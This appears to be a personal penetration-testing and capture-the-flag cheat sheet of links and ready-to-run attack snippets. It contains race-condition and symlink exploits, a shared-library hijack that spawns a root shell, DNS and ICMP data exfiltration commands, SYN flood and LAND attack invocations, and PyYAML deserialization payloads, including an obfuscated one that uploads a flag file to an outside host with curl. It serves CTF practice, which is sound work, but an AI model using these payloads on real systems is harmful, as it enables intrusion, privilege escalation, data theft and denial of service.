# +

- https://fortyseven.github.io/ctfpanel/
- https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
- https://snovvcrash.rocks/cheatsheets/
- https://hausec.com/pentesting-cheatsheet/
- http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
- http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
- https://github.com/Orange-Cyberdefense/arsenal
- https://github.com/enaqx/awesome-pentest
- https://github.com/kyawthiha7/pentest-methodology
- https://prune2000.github.io/tools/pentest/

# racing, race-condition

- [Temmo's Tiny Shop - 0CTF 2017](https://www.40huo.cn/blog/0ctf-2017-writeup.html)
    ```bash
    username=
    password=
    cookie1="PHPSESSID=3k21rt4acut215r1adlrq5m0p0"
    cookie2="PHPSESSID=ck8pgb52nkkb8sdg2c95ms7s16"
    url="http://202.120.7.197/app.php"

    curl "$url?action=login" -b $cookie1 -d "username=$username&pwd=$password" &
    curl "$url?action=login" -b $cookie2 -d "username=$username&pwd=$password"

    curl "$url?action=buy&id=1" -b $cookie1

    curl "$url?action=sale&id=1" -b $cookie1 &
    curl "$url?action=sale&id=1" -b $cookie2
    ```

- https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#-chain-race
    - ~/share/ctf/darkctf2020/chain-race/

### TOCTOU

```bash
while true; do
    dd if=/dev/urandom count=$((1024 * 20)) bs=1024 > bigfile
    chmod 777 bigfile
    /exploitable bigfile &
    ln -sf /root/flag.txt bigfile
    sleep 0.1
    rm -f bigfile
done
```

- https://github.com/kahla-sec/CTF-Writeups/blob/master/DarkCTF2020/McQueen.md

### symlink

- [Book \- HackThebox | Samir Ettali](https://samirettali.com/writeups/hackthebox/book/)
    - https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition
        ```bash
        # logrotate: stat /tmp/logs/file.log
        # attacker:
        mv /tmp/logs /tmp/logs2
        ln -s /etc/bash_completion.d /tmp/logs
        # logrotate: create+chown /tmp/logs/file.log
        # attacker:
        echo 'payload' > /tmp/logs/file.log
        # On root login, payload executed
        ```

# priviledge escalation

- https://gtfobins.github.io
- busybox - act as arbitrary file
    ```bash
    # if owner of file, can use chmod to fix permissions
    upx -o /tmp/chmod /bin/busybox
    # || tar
    # || /lib/ld-musl-x86_64.so.1 /bin/busybox cat
    # || setpriv /bin/busybox cat
    ```

- root owned + bad permissions (e.g. 777)
    - if shared library, compile our own, given called function "foo":
        ```c
        #include <stdlib.h>
        void foo() {
            system("/bin/sh");
        }
        ```
        ```bash
        gcc vuln.c -shared -o vuln.so
        ```

### enumeration

- ~/opt/privilege-escalation-awesome-scripts-suite/
- ~/opt/LinEnum/

```bash
sudo -l

# specific uid
find / -uid 1001 -type f 2>/dev/null

# suid
find / -perm -u=s -type f 2>/dev/null
```

# remote code exection (rce)

- [Hacking with Environment Variables](https://www.elttam.com/blog/env/)

# process pseudo-filesystem

- /proc/self/cmdline
- /proc/self/cwd
- /proc/self/environ
- /proc/self/maps
   - [!] zero size, but sequentially readable (e.g. `cat`, http request with header `Range: bytes 0-4096`)

# data exfiltration

- DNS
    - https://www.aldeid.com/wiki/File-transfer-via-DNS
        ```bash
        # 1. server
        sudo tcpdump -i eth1 -s0 -w loremipsum.pcap 'port 53 and host 192.168.1.29'
        # 2. client
        for b in `cat loremipsum.hex`; do dig @192.168.1.23 $b.fakednsrequest.com; done
        # 3. server
        tcpdump -n -r loremipsum.pcap 'host 192.168.1.29 and host 192.168.1.23' \
            | grep fakednsrequest \
            | cut -d ' ' -f 8 \
            | cut -d '.' -f 1 \
            | uniq \
            | xxd -r -p > loremipsum.txt
        ```
    - https://github.com/leonjza/dnsfilexfer
    - https://github.com/vp777/DNS-data-exfiltration
- TCP
    ```bash
    # ICMP (using file contents)
    hping3 -E foo.txt -1 -u -i 10 -d 1.2.3.4 95
    # TCP ACK (using file contents)
    hping3 -E foo.txt -A 1.2.3.4
    # SYN flood
    hping3 -V -c 1000 -d 100 -p 8080 -S -- flood 1.2.3.4
    # LAND attack
    hping3 -V -c 1000 -d 100 -p 8080 -s 18080 -S -k -a 1.2.3.4 1.2.3.4
    ```
- URI scheme
    - file, ftp, zlib, data, glob, phar, ssh2, rar, ogg, ftps, compress.zlib, compress.bzip2, zip
- bypass URL access rules with redirections (responses with code 3xx)
    - repeat parameter containing url to visit: 2nd url redirects to 3rd url
    ```php
    <?php
    header('HTTP/1.1 301 Redirect');
    header('Location: php://filter/string.toupper/resource=index.php');
    ?>
    ```
- USB over IP
    - [CTFtime\.org / CyberSecurityRumble CTF / EZExfil / Writeup](https://ctftime.org/writeup/24786)
    ```bash
    # On localhost:
    # Given "GatewayPorts yes" enabled in $vps_host sshd_config
    ssh $user@$vps_host -R 3240:localhost:3240

    # On $vps_host:
    sudo modprobe usbip-host
    sudo modprobe usbip-core
    sudo usbipd -D
    sudo usbip list -l # Take bus id of second keyboard = 1-7
    sudo usbip --debug bind -b 1-7

    # On $vulnerable_host:
    # Given TTY of connected user = ttyS0
    /sbin/usbip attach -r $vps_host -b 1-7 &
    cat /dev/ttyS0

    # On $vps_host:
    cat flag.txt > /dev/ttyS0
    ```

# encodings

Binary-to-text

- https://en.wikipedia.org/wiki/Category:Binary-to-text_encoding_formats

Morse

> The Morse code consists of several "dot", "dash" and "interval". The ratio of "dot" and "dash" is 1:3, The ratio of "intra-code interval", "inter-code interval" and "code group interval" is 1:3:5
    - ~/Downloads/Morse Recognition Algorithm Based on K-means.pdf
- "dot" = ".", "dash" = "-", "intra-code interval" = " ", "inter-code interval" = " ", "code group interval" = "/"
- https://morsecode.world/international/timing.html

# signal decoding

- sound of keystrokes to keys
    - https://www.xil.se/post/sharifctf-2016-misc-sound-rspkt/
- digital radio transmission decoder
    - https://github.com/EliasOenal/multimon-ng

# yaml

- PyYAML yaml.load()
    - https://imcmy.me/hitcon-ctf-2016-writeup-archive/
        ```yaml
        some_option: !!python/object/apply:os.system ["cat flag.txt"]`
        # ||
        some_option: !!python/object/apply:subprocess.call
          args: [wget foo.com/"$(cat flag)"]
          kwds: {shell: true}
        ```
    - https://hackmd.io/@harrier/uiuctf20
        - https://github.com/yaml/pyyaml/pull/386
        - https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1
        ```yaml
        !!python/object/new:type
          args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
          listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt')"
        ```
